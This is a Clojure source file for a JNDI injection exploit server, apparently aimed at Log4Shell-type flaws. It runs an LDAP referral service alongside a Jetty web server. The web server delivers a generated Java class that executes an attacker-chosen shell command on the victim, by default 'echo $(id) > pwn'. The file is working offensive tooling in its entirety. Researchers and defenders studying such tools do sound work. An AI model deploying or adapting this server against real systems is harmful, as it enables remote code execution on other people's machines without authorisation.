(ns jndi-injector-clj.core
  (:gen-class)
  (:import [org.pwn
            Payload]
           [javassist.bytecode
            ClassFile])
  (:require [ring.adapter.jetty :as jetty]
            [jndi-injector-clj.ldap :as ldap]
            [clojure.tools.cli :refer [parse-opts]]))

(def charset
  (->> (concat (range 48 58) (range 97 123))
       (map #(char %))))

(defn pick-char []
  (->> (count charset)
       (rand-int)
       (nth charset)))

(defn gen-str []
  (loop [index 6 url ""]
    (if (zero? index)
      url
      (recur (dec index) (str url (pick-char))))))

(defn gen-conf [options]
  {:port    (:port options)
   :command (:command options)
   :java7 {:ldap-base (gen-str) :class-name (gen-str)}
   :java8 {:ldap-base (gen-str) :class-name (gen-str)}})

(defn gen-handler [payload]
  (fn [request]
    (println "[+] incoming request " (:uri request))
    {:status 200
     :body payload}))

(def cli-options
  [["-c" "--command COMMAND" "command to execute"
    :default "echo $(id) > pwn"]
   ["-p" "--port PORT" "webserver port"
    :default 3000
    :parse-fn #(Integer/parseInt %)
    :validate [#(< 0 % 0x10000) "Must be a number between 0 and 65536"]]
   ["-h" "--help"]])

(defn -main [& args]
  (let [options (:options (parse-opts args cli-options))
        port (:port options)
        url (str "http://localhost:" port "/")
        class-name (gen-str)
        command (:command options)
        handler (gen-handler (Payload/build command  ClassFile/JAVA_8 class-name))]
    (.start (Thread. (fn [] (ldap/start url class-name))))
    (jetty/run-jetty handler {:port port})))
